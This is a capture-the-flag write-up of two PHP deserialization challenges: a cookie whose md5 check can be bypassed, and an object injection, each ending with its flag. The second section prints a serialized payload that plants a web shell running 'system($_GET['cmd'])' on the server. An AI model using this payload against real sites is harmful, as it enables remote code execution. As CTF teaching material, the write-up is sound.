# free-as-in-beer ![c](https://img.shields.io/badge/solved-success)
### Analysis
Let's analyze the source code given to us in the Page. We can clearly see that there is an unserialization of a cookie (looks sooooo bad) when the first 32 chars of the cookie named "todos" are equal to the md5 hash of the last 32 chars.
That is, the PHP code reads the input from the user with a GET, calculates the hash and concatenates it with the raw input, and then sets it as a cookie.

Moreover, we can notice a really interesting object called X with a magic methods __toString() in it (looks even worse).

Knowing that we can try to bypass the hash condition, crafting our cookie, and modify the parameters of the X object in order to read a specific file (we know that the flag is in flag.php).

### Exploit
![Alt text](./cookie_burp.PNG?raw=true "Title")

**flag{This_flAg_1s_really_fr33_a5_in_PhP}**

# 1024 ![c](https://img.shields.io/badge/solved-success)
### Analysis
### Exploit
```
O:7:"Ranking":3:{s:7:"ranking";s:34:"<?php echo system($_GET['cmd']);?>";s:7:"changed";b:1;s:4:"path";s:20:"./games/revshell.php";}
```
![Alt text](./result_1024.PNG?raw=true "Title")

**flag{never_deserialize_user_input!}**
